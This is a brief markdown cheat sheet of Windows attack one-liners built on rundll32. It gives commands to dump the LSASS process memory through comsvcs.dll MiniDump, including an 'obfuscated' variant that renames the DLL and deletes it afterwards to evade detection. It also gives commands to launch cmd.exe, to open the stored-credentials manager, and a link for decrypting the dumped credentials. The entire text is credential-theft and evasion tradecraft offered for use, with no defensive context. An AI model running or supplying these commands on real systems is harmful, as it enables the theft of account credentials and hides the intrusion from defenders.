### Dump lsass process
```
rundll32.exe C:\windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id <fullPath>\lsassdump.dmp full
```

### Dump lsass process obfuscated
```
$id = Get-Process lsass; cd c:\tmp; copy C:\Windows\System32\comsvcs.dll <newName>.dll; rundll32.exe <newName>.dll, MiniDump $id.Id c:\tmp\<file>.dmp full; Wait-Process -Id (Get-Process rundll32).id; del <newName>.dll;
```

### Run cmd.exe
```
rundll32.exe SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c <command>
```

### Dump passwords of DPAPI to file
```
rundll32.exe keymgr.dll, KRShowKeyMgr
```

### Decrypt using
https://www.nirsoft.net/utils/credentials_file_view.html

